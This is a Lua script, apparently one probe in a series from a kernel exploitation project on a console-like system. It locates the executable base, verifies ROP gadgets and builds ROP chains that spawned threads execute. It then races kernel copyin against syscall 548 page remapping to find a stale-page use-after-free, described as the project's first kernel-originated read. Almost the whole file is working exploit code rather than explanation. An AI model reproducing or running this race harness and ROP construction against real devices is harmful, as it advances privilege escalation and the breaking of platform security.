-- CRASH_CLASS: MODERATE
-- PROBE 1529a: race a kernel copyin (write from V) against 548 op-3 replacing V
--
-- Context: 1528b closed the pure vm_map-churn race (56 collisions, zero
-- corruption) -- delete/insert is serialised by the map lock. But churn has no
-- returnable oracle: a corrupted page table would only ever panic. This probe
-- races something whose result comes back to us.
--
-- The child's ROP chain calls write(sockA, V, 0x100) in a loop. The kernel does
-- copyin(user_src = V) for every call, and the bytes land in sockB, which the
-- main thread drains. The main thread meanwhile calls 548 op 3 with MAP_FIXED
-- over V, which FREES the physical page behind V and installs a fresh zeroed
-- anon one every round.
--
-- The oracle: V is never written by us, so every byte the child can legitimately
-- copy is zero. A non-zero byte in the drain means the kernel copied from a
-- physical page it had already returned to the free list -- i.e. a stale page
-- mapping, and the project's first kernel-originated read.
--
-- A refused store is silently swallowed (381a) and an unmapped munmap is EINVAL,
-- so nothing here depends on a store succeeding. The one hard rule is that the
-- main thread must never block: every drain uses MSG_DONTWAIT (0x80).
--
-- prior art: probes/phase36_realargs/1528b_native_race_waves.lua (native child-ROP race harness, proven)
-- prior art: probes/phase36_realargs/1528a_native_race_op3_munmap.lua (catalog gadgets verify exactly)
-- prior art: probes/phase36_realargs/1508a_sys548_map_fixed.lua (op 3 honours MAP_FIXED)
-- prior art: probes/phase36_realargs/1512a_sys548_op3_split.lua (op 3 frees and re-inserts the entry)
-- prior art: probes/phase5_buffer_io/33e_dontwait.lua (MSG_DONTWAIT 0x80)
-- prior art: probes/phase13_53batch/56o_unix_creds_signal_frame.lua (socketpair 135 shape)

print("=== PROBE 1529a: copyin race vs 548 op 3 ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function hi_lo(v)
    if type(v) == "table" and v.h then return v.h, v.l end
    return 0, N(v)
end
local function fa(v)
    if v == nil then return "nil" end
    local h, l = hi_lo(v)
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pidv = N(native.fcall_with_rax(stub, 20))
print("fn_addr=" .. fa(stub) .. " pid=" .. pidv)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pidv end

local sc_mmap = mk(477)
local sc_recvfrom = mk(29)
local sc_593 = mk(593)
local sc_thr_new = mk(455)
local sc_sp = mk(135)

-- [A] gadgets
print("")
print("[A] gadget verification")
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() sc_593(uint64(0), info) end)
local elo = rd(N(info) + 0x108)
local ehi = rd(N(info) + 0x10C)
if not elo or not ehi then print("ABORT: no eboot base"); return end
local eboot = uint64(string.format("0x%X%08X", ehi, elo))
local sb0 = N(eboot)
print("eboot=" .. fa(eboot))

local function bytes_at(off, n)
    local out = {}
    for i = 0, n - 1 do
        local w = rd(sb0 + off + (i - (i % 4)))
        if not w then return nil end
        out[i + 1] = math.floor(w / 2 ^ ((i % 4) * 8)) % 256
    end
    return out
end
local function verifies(off, sig)
    local b = bytes_at(off, #sig)
    if not b then return false end
    for i = 1, #sig do if b[i] ~= sig[i] then return false end end
    return true
end

local pop_rax, pop_rdi, pop_rsi, pop_rdx, bare = nil, nil, nil, nil, nil
if verifies(0x992, {0x58, 0xC3}) then pop_rax = 0x992 end
if verifies(0xC9DFE, {0x5F, 0xC3}) then pop_rdi = 0xC9DFE end
if verifies(0xD77D, {0x5E, 0xC3}) then pop_rsi = 0xD77D end
if verifies(0x3B02D7, {0x5A, 0xC3}) then pop_rdx = 0x3B02D7 end
if verifies(0x42, {0xC3}) then bare = 0x42 end
print(string.format("  pop_rax=%s pop_rdi=%s pop_rsi=%s pop_rdx=%s bare=%s",
    pop_rax and "OK" or "NONE", pop_rdi and "OK" or "NONE",
    pop_rsi and "OK" or "NONE", pop_rdx and "OK" or "NONE", bare and "OK" or "NONE"))
if not (pop_rax and pop_rdi and pop_rsi and pop_rdx and bare) then
    print("ABORT: gadget set incomplete")
    return
end
local g_rax = eboot + pop_rax
local g_rdi = eboot + pop_rdi
local g_rsi = eboot + pop_rsi
local g_rdx = eboot + pop_rdx
local g_ret = eboot + bare

-- [B] socketpair + victim
print("")
print("[B] socketpair + victim")
local sv = memory.alloc(8)
wd(N(sv), 0); wd(N(sv) + 4, 0)
local ok1, r1 = pcall(function() return sc_sp(uint64(1), uint64(2), uint64(0), uint64(N(sv))) end)
local spret = ok1 and N(r1) or -999
local fdA = rd(N(sv))
local fdB = rd(N(sv) + 4)
print(string.format("  socketpair rv=%d fds=%s,%s", spret, tostring(fdA), tostring(fdB)))
if spret ~= 0 or not fdA or not fdB or fdA < 0 or fdB < 0 then print("ABORT: no socketpair"); return end

local VSZ = 0x10000
local vrv = sc_mmap(uint64(0), uint64(VSZ), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local V = N(vrv)
print("  mmap -> " .. fa(vrv))
if V < 0x10000 then print("ABORT: no victim"); return end

local CHUNK = 0x100
local ITERS = 1200
local NSTACKS = 4

-- One stack per wave. The first version spawned every child onto one shared
-- chain: a child that blocks in send() lingers, the next child starts at the
-- same rsp, and the two walk the same qwords until one runs past the last
-- entry and executes address 0 (run 2 died at RIP=0 with RAX=0x100, i.e. right
-- after a successful write). Distinct stacks make an overlap harmless.
local stacks = {}
for k = 1, NSTACKS do
    local alloc = 0x4000 + ITERS * 24 + 0x400
    local mem = memory.alloc(alloc)
    local base = N(mem)
    local rp = base + 0x4000 - 8
    local qi = 0
    local function put2(v) wq(rp + qi * 8, v); qi = qi + 1 end
    put2(g_rdi); put2(uint64(129))
    put2(g_rsi); put2(uint64(N(fs_ptr)))
    put2(g_rax); put2(uint64(165)); put2(stub)
    put2(g_rdi); put2(uint64(fdA))
    put2(g_rsi); put2(uint64(V))
    put2(g_rdx); put2(uint64(CHUNK))
    put2(g_rax); put2(uint64(4)); put2(stub)
    for i = 2, ITERS do put2(g_rax); put2(uint64(4)); put2(stub) end
    put2(g_rdi); put2(uint64(0))
    put2(g_rax); put2(uint64(431)); put2(stub)
    for i = 1, 8 do put2(g_ret) end
    local prm = memory.alloc(0x40)
    local pp = N(prm)
    for i = 0, 0x3C, 4 do wd(pp + i, 0) end
    local tidp = memory.alloc(8)
    wq(N(tidp), uint64(0))
    wq(pp + 0x00, g_ret)
    wq(pp + 0x08, uint64(V))
    wq(pp + 0x10, uint64(base))
    wq(pp + 0x18, uint64(0x4000))
    wq(pp + 0x30, tidp)
    stacks[k] = { param = prm, tidp = tidp, qwords = qi, base = base }
end
print(string.format("  %d stacks, %d qwords each, first stack=%s",
    NSTACKS, stacks[1].qwords, fa(uint64(stacks[1].base))))

local rd_buf = memory.alloc(0x8000)
local rb = N(rd_buf)

-- drain(): non-blocking, never sleeps. Returns bytes read this call.
local function drain()
    local total = 0
    for k = 1, 64 do
        local okr, rr = pcall(function() return sc_recvfrom(uint64(fdB), uint64(rb), uint64(0x8000), uint64(0x80), uint64(0), uint64(0)) end)
        local n = okr and N(rr) or -1
        if n <= 0 then break end
        total = total + n
        local oks, s = pcall(function() return memory.read_buffer(rb, n) end)
        if not oks then s = nil end
        if s then
            STAT.bytes = STAT.bytes + n
            local pos = 1
            while true do
                local b, e = s:find("[^%z]", pos)
                if not b then break end
                STAT.nonzero = STAT.nonzero + 1
                if STAT.first == nil then
                    local lo = math.max(1, b - 2)
                    local frag = ""
                    for j = lo, math.min(#s, b + 2) do
                        frag = frag .. string.format("%02X ", s:byte(j))
                    end
                    STAT.first = string.format("offset %d in a %d-byte read: %s", b, n, frag)
                end
                pos = e + 1
            end
        end
    end
    return total
end
STAT = { bytes = 0, nonzero = 0, first = nil }

local spawned, spawn_fail = 0, 0
local wave = 0
local function spawn_child()
    wave = wave + 1
    local st = stacks[((wave - 1) % NSTACKS) + 1]
    local ok2, rv2 = pcall(function() return sc_thr_new(st.param, uint64(0x38)) end)
    local r = ok2 and N(rv2) or -999
    if r == 0 then spawned = spawned + 1 else spawn_fail = spawn_fail + 1 end
    return r
end

-- [C] baseline: no churn at all, the child just writes zeros
print("")
print("[C] baseline: child writes from an untouched zero page, no churn")
STAT = { bytes = 0, nonzero = 0, first = nil }
print("  spawn ret=" .. spawn_child())
for i = 1, 200 do drain() end
for i = 1, 50 do drain() end
print(string.format("  bytes=%d nonzero=%d first=%s", STAT.bytes, STAT.nonzero, tostring(STAT.first)))
if STAT.bytes == 0 then print("ABORT: the child delivered nothing; the oracle cannot work"); return end
if STAT.nonzero > 0 then
    print("  BASELINE ALREADY NON-ZERO -- V was not zero, oracle invalid")
else
    print("  baseline clean: every byte the kernel copied was zero, as expected")
end
if not alive() then print("DEAD after baseline"); return end

-- [D] race
print("")
print("[D] race: op 3 replaces V each round while children copy from it")
local ent = memory.alloc(0x40)
local ea = N(ent)
local done = memory.alloc(8)
local da = N(done)
local sc548 = mk(548)
local function remap(protn)
    for i = 0, 0x3C, 4 do wd(ea + i, 0) end
    wq(ea + 0x00, uint64(V))
    wq(ea + 0x10, uint64(VSZ))
    wd(ea + 0x18, protn)
    wd(ea + 0x1C, 3)
    wd(da, 0xEEEEEEEE)
    local rv = -999
    pcall(function() rv = N(sc548(uint64(0), uint64(0x10), uint64(ea), uint64(1), uint64(da), uint64(0))) end)
    return rv
end

STAT = { bytes = 0, nonzero = 0, first = nil }
local ROUNDS = 600
-- Four waves, one per stack, spaced so a child that blocks in send() has run
-- long before the next one starts on a different stack.
local wave_rounds = {1, 150, 300, 450}
local bad_place = 0
for i = 1, ROUNDS do
    for _, wr in ipairs(wave_rounds) do
        if i == wr then spawn_child() end
    end
    if N(remap(3)) ~= V then bad_place = bad_place + 1 end
    drain()
    if i % 100 == 0 then
        print(string.format("  round %d: bytes=%d nonzero=%d bad_place=%d spawned=%d fail=%d first=%s",
            i, STAT.bytes, STAT.nonzero, bad_place, spawned, spawn_fail, tostring(STAT.first)))
    end
end
-- final drain after the last child has had time to finish
for i = 1, 300 do drain() end
print(string.format("  done: bytes=%d nonzero=%d bad_place=%d spawned=%d spawn_fail=%d",
    STAT.bytes, STAT.nonzero, bad_place, spawned, spawn_fail))
if STAT.first then print("  FIRST NON-ZERO: " .. STAT.first) end

-- [E] verdict
print("")
print("[E] verdict")
print("  alive=" .. tostring(alive()) .. " pid=" .. N(native.fcall_with_rax(stub, 20)))
if STAT.nonzero == 0 then
    print("  VERDICT: every byte the kernel copied out of V was zero across "
        .. STAT.bytes .. " drained bytes -- no stale page mapping observed")
else
    print("  VERDICT: " .. STAT.nonzero .. " non-zero byte(s) of " .. STAT.bytes
        .. " -- investigate the sample above before trusting it")
end
print("")
print("=== PROBE 1529a COMPLETE ===")
